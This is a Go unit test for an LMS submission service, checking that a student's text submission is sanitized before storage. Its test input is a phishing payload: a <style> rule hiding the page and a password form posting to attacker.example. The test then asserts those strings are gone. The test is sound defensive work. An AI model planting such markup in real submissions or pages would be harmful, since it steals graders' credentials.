package service_test

import (
	"context"
	"errors"
	"testing"

	"github.com/EduThemes/paper-lms/internal/domain/models"
	"github.com/EduThemes/paper-lms/internal/service"
	"github.com/EduThemes/paper-lms/internal/testutil/mocks"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/mock"
)

// B002 regression: a student's online_text_entry body is stored sanitized, so
// a <style> overlay / phishing <form> never reaches the grader's browser.
func TestCreate_SanitizesSubmissionBody(t *testing.T) {
	assignmentRepo := new(mocks.MockAssignmentRepository)
	submissionRepo := new(mocks.MockSubmissionRepository)
	enrollmentRepo := new(mocks.MockEnrollmentRepository)

	assignmentRepo.On("FindByID", mock.Anything, uint(1), uint(0)).
		Return(&models.Assignment{ID: 1, CourseID: 1, Name: "HW1"}, nil)
	submissionRepo.On("FindByAssignmentAndUser", mock.Anything, uint(1), uint(10), uint(0)).
		Return(nil, errors.New("not found"))
	var stored *models.Submission
	submissionRepo.On("Create", mock.Anything, mock.AnythingOfType("*models.Submission")).
		Run(func(args mock.Arguments) { stored = args.Get(1).(*models.Submission) }).
		Return(nil)

	svc := service.NewSubmissionService(submissionRepo, assignmentRepo, enrollmentRepo,
		new(mocks.MockLatePolicyRepository), new(mocks.MockCourseRepository),
		new(mocks.MockGradingPeriodGroupRepository), new(mocks.MockGradingPeriodRepository), nil)
	body := `<p>My essay</p><style>body *{visibility:hidden}</style>` +
		`<form><input name="password"><button formaction="https://attacker.example/x">Log in</button></form>`
	sub := &models.Submission{AssignmentID: 1, UserID: 10, SubmissionType: ptrString("online_text_entry"), Body: ptrString(body)}

	assert.NoError(t, svc.Create(context.Background(), sub))
	if assert.NotNil(t, stored) && assert.NotNil(t, stored.Body) {
		assert.Contains(t, *stored.Body, "<p>My essay</p>")
		for _, bad := range []string{"<style", "<form", "<input", "formaction", "attacker.example"} {
			assert.NotContains(t, *stored.Body, bad)
		}
	}
}
